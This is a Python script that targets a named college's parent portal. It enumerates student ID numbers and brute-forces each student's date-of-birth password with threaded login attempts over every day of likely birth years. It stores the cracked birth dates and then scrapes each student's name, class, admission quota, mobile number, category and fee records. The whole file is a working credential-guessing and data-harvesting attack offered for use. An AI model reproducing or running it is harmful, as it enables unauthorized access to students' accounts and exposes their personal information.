import pickle
from typing import Union
import time
from functools import wraps

from scraper import Scraper
from threading import Thread


def cached(cache):
    def cashee(func):
        func.cache = cache

        @wraps(func)
        def wrapper(self, *args):
            try:
                r = func.cache[args]
                print(f"[Log] Using Cache")
                return r
            except KeyError:
                func.cache[args] = result = func(self, *args)
                return result

        return wrapper

    return cashee


class SisScraper(Scraper):
    @staticmethod
    def gen_payload() -> dict[str, str]:
        return {
            "username": "",
            "dd": "",
            "mm": "",
            "yyyy": "",
            "passwd": "",
            "remember": "",
            "option": "com_user",
            "task": "login",
            "return": "",
            "ea07d18ec2752bcca07e20a852d96337": "1"
        }

    @staticmethod
    def gen_usn(year: str, dept: str, i: int, head="1MS") -> str:
        return f"{head}{year}{dept}{i:03}"

    @staticmethod
    def get_cache():
        try:
            with open('cache1er2344.bin', 'rb') as file:
                return pickle.load(file)
        except FileNotFoundError:
            return {}

    def __init__(self, URL="https://parents.msrit.edu/"):
        self.URL = URL
        super(SisScraper, self).__init__()

    def get_stats(self, payload) -> dict[str, str]:
        self.start_session()
        soup = self.get_soap(self.URL, "POST", payload)
        body = soup.body
        if body.find(id="username"): return {}
        td = body.find_all("td")
        trs = body.find_all("tbody")[1].find_all("tr")
        self.stop_session()
        return {
            "name": body.find_all("h3")[0].text,
            "usn": payload["username"],
            "dob": payload["passwd"],
            "class": body.find_all("p")[6].text.strip(),
            "quota": td[4].text[7:],
            "mob": td[5].text[8:],
            "cat": td[8].text[18:],
            "paid": [tr.find_all("td")[3].text for tr in trs]
        }

    def get_post_body(self, payload):
        soup = self.get_soap(self.URL, "POST", payload)
        body = soup.body
        if not body.find(id="username"): return body

    @cached(get_cache())
    def get_dob(self, usn) -> Union[str, None]:
        join_year = int("20" + usn[3:5])
        for year in [y := join_year - 18, y - 1, y + 1]:
            if dob := self.brute_year(usn, year): return dob

    def brute_year(self, usn: str, year: int) -> Union[str, None]:
        workers = []
        dat = [None]
        t = time.time()
        self.start_session()
        for i in range(1, 13):
            worker = Thread(target=self.brute_month, args=(usn, year, i, dat))
            workers.append(worker)
            worker.start()
        for worker in workers:
            worker.join()
        self.stop_session()
        print("[Log] Time:", time.time() - t, "sec")
        return dat.pop()

    def brute_month(self, usn: str, year: int, month: int, dat: list) -> Union[str, None]:
        payload = self.gen_payload()
        for i in range(1, 32):
            if len(dat) > 1: return
            payload['username'] = usn.lower()
            payload['passwd'] = f"{year}-{month:02}-{i:02}"
            if self.get_post_body(payload):
                dat.append(payload['passwd'])
                return payload['passwd']

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        with open('cache1er2344.bin', 'wb') as file:
            pickle.dump(self.get_dob.cache, file)


if __name__ == '__main__':
    YEAR = "21"
    DEPT = "IS"
    with SisScraper() as SIS:
        for _i in [18, 17]:
            _payload = SIS.gen_payload()
            _payload['username'] = SIS.gen_usn(YEAR, DEPT, _i)
            _payload['passwd'] = SIS.get_dob(_payload['username'])
            _stats = SIS.get_stats(_payload)
            print(_stats)
